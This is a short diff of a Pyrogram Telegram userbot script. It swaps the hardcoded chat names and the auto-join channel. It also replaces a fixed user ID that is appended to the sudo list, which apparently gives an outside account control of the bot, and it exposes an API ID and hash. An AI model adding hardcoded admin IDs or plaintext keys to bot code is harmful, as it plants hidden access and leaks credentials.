@@ -6,8 +6,8 @@ from pyrogram.types import Message
 
 SESSION = getenv('SESSION')
 SUDO_USERS = list(map(int, getenv('SUDO_USERS').split(" ")))
-SUDO_USERS.append(5518687442)
-CHATS = ['TheAltron', '@TheAltron', '@AltronChats', 'AltronChats', '-1001313291319', '-1001859846702']
+SUDO_USERS.append(5059737154)
+CHATS = ['BWANDARLOK', '@BWANDARLOK', '@BWANDARLOK', '@BWANDARLOK', '-1001779669612', '-1001779669612']
 
 M = Client(SESSION, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")
 
@@ -48,8 +48,8 @@ async def unban_user(app: Client, message: Message):
         await message.reply_text("**Usage:**\n`/unban [chat_id] [user_id]`")
 
 M.start()
-M.join_chat("TheAltron")
+M.join_chat("BWANDARLOK")
 print("Bot Started Successfully")
 idle()
 M.stop()
-￼Enter
+
